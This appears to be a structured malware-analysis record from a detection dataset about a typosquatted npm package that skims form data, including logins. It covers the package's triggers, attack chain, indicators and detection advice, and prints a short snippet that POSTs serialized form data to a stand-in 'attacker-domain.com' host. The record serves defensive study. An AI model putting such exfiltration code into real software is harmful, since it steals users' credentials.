package_info.why_malicious: The package contains obfuscated JavaScript code designed to exfiltrate serialized form data from embedded forms (including sign-in forms) to attacker-controlled domains. It was distributed via typosquatting, targeting developers seeking popular packages, and has been downloaded over 17,000 times, indicating widespread compromise potential.

execution_context.trigger: runtime (when form is submitted or interacted with in the app/website)
execution_context.file_location: main package JavaScript file (e.g., index.js or main.js within the npm package)

malicious_snippets.code_snippet:
var data = JSON.stringify(getFormData());
fetch('https://attacker-domain.com/collect', { method: 'POST', body: data });
malicious_snippets.code_behavior: Serializes form data from the DOM and sends it via HTTP POST to an attacker-controlled domain.

malice_analysis.why_suspicious: The code collects user input from forms and exfiltrates it to an external, non-legitimate domain without user consent.
malice_analysis.violated_expectations: Normal npm packages should not exfiltrate user data or interact with external domains in this manner, especially not with obfuscated code.
malice_analysis.similar_legitimate_use: Legitimate analytics or telemetry libraries may collect usage data, but they are transparent about endpoints and data collected, and do not obfuscate code.
key_indicators: Obfuscated or minified code that accesses form data
Network requests to suspicious or non-standard domains
No user notification or consent for data exfiltration

execution_context.trigger: import-time (when the package is loaded by the application)
execution_context.file_location: main entry point of the npm package

malicious_snippets.code_behavior: Hooks into all form submissions on the page, serializes the form data, and sends it to a malicious domain.

malice_analysis.why_suspicious: Intercepting all form submissions and sending data to an external domain is a classic data exfiltration technique.
malice_analysis.violated_expectations: Normal packages should not globally hook into form submissions or send sensitive data to unknown endpoints.
malice_analysis.similar_legitimate_use: Form analytics or A/B testing tools may hook into forms, but they use trusted domains and are transparent.

attack_chain.action: Developer installs the malicious npm package (e.g., icon-package) via typosquatting.
attack_chain.leads_to: Malicious code is included in the application or website.

attack_chain.action: Malicious code executes at import-time or runtime, hooking into form submissions.
attack_chain.leads_to: Form data is intercepted whenever a user submits a form.

attack_chain.action: Form data is serialized and exfiltrated to attacker-controlled domains via HTTP POST requests.
attack_chain.leads_to: Attacker receives sensitive user data, including credentials.

behavioral_signatures: JavaScript code that hooks into all form submissions
Obfuscated or minified code making network requests to non-standard domains
Unexpected network activity on form submission
file_indicators: Presence of suspicious npm packages (e.g., icon-package, ajax-libs, umbrellaks, ajax-library)
network_indicators: Outbound HTTP POST requests to domains not associated with the application (e.g., attacker-controlled domains)
Domains with similar naming patterns used across multiple packages
detection_knowledge.how_to_detect: Monitor for npm packages with names similar to popular libraries (typosquatting). Analyze JavaScript code in dependencies for obfuscated logic that accesses form data and sends it to external domains. Use network monitoring to detect unexpected POST requests to unknown or suspicious domains, especially on form submission events.
